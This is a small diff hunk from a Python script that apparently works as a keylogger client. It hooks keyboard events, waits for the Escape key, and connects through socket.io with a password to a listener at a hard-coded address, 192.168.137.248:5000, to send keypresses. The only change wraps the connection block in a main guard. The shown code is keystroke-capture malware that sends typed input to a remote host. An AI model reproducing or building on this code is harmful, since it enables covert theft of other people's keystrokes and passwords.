@@ -41,11 +41,12 @@ def send_keypress():
     keyboard.on_press(on_key_event)
     keyboard.wait("esc")  
 
-try:
-    sio.connect("http://192.168.137.248:5000", auth={"password": password})
-    send_keypress()
-    sio.disconnect()
-except KeyboardInterrupt:
-    print("[-] Quit")
-except Exception as e:
-    print(f"[-] Error : {e}")
+if __name__ == "__main__":
+    try:
+        sio.connect("http://192.168.137.248:5000", auth={"password": password})
+        send_keypress()
+        sio.disconnect()
+    except KeyboardInterrupt:
+        print("[-] Quit")
+    except Exception as e:
+        print(f"[-] Error : {e}")
